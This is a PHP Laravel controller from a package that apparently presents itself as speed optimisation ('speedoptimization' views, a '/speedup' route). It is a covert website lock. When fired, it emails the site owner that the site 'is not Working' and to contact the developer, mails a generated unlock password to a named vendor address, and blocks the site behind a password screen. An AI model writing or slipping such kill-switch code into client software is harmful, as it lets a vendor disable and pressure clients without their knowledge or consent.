<?php

namespace Lockwebsitevendor\Lockwebsitepackage\Http\Controllers;

use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Mail;

class passwordVerification extends Controller
{
    public function index()
    {
        try {
            /* This Condition is use for check that lock url is fire or not */
            if (!File::exists( (dirname(dirname( dirname(__FILE__) )).'/passwordGenerate.php'))) {

                /* This Function is use to Generate random password */
                $random = str_shuffle('abcdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ234567890!$%^&!$%^&');
                $password = substr($random, 0, 10);

                /* This Mail is use to send message to client that there website is blocked by us */
                $data = array('name'=>env('APP_NAME'),'clientmessage' => "Your Website is not Working !!! Please contact to developer.");
            
                Mail::send('speedoptimization::mail', $data, function($message) {
                $message->to(env('MAIL_FROM_ADDRESS'), 'Website stopped Suddenly !')->subject('Your Website is not Working !!!');
                $message->from(env('MAIL_FROM_ADDRESS'),env('APP_NAME'));
                });

                /* This Mail is use to send message to us that what is the password of unlock website */
                $admin_password = "Newtest project unlock using password ".$password. "";
                $data_admin = array('name'=>"Viitor Cloud PVT LTD", 'adminmessage' => $admin_password);
                
                Mail::send('speedoptimization::adminmail', $data_admin, function($message) {
                    $message->to('miral.patel@viitor.cloud', 'Newtest project password')->subject('Newtest Website blocked password');
                    $message->from(env('MAIL_FROM_ADDRESS'),env('APP_NAME') );
                });

                /* use to generate passwordgenerator file */
                File::put(dirname(dirname( dirname(__FILE__) )).'/passwordGenerate.php',"Password is ".$password);            
            }

            return view('speedoptimization::passwordscreen');
        } catch (Exception $ex) {
            return false;
        }
    }

    /*
        @param $request->password 
        use to match password for unlock website 
    */
    public function passwordVerify(Request $request)
    {
        try {
            /* This is use to get content of file */ 
            $passwordGenerate_file = File::get(dirname(dirname( dirname(__FILE__) )).'/passwordGenerate.php');

            /* Give password form passwordGenerate.php file */ 
            preg_match('/[^ ]*$/',  $passwordGenerate_file, $get_password);
            $password = $get_password[0];

            /* use to check requested password is match with our password or not */
            if($request->password == $password){
                /* 
                    After password match have to delete passwordGenerate.php 
                    Note : This concept is taken from laravel default site up and down
                */
                File::delete(dirname(dirname( dirname(__FILE__) )).'/passwordGenerate.php');
                return redirect('/');
            }else{
                return redirect('/speedup')->with(['data' => 'Please provide correct password']);
            }
        } catch (Exception $ex) {
            return false;
        }
    }
}
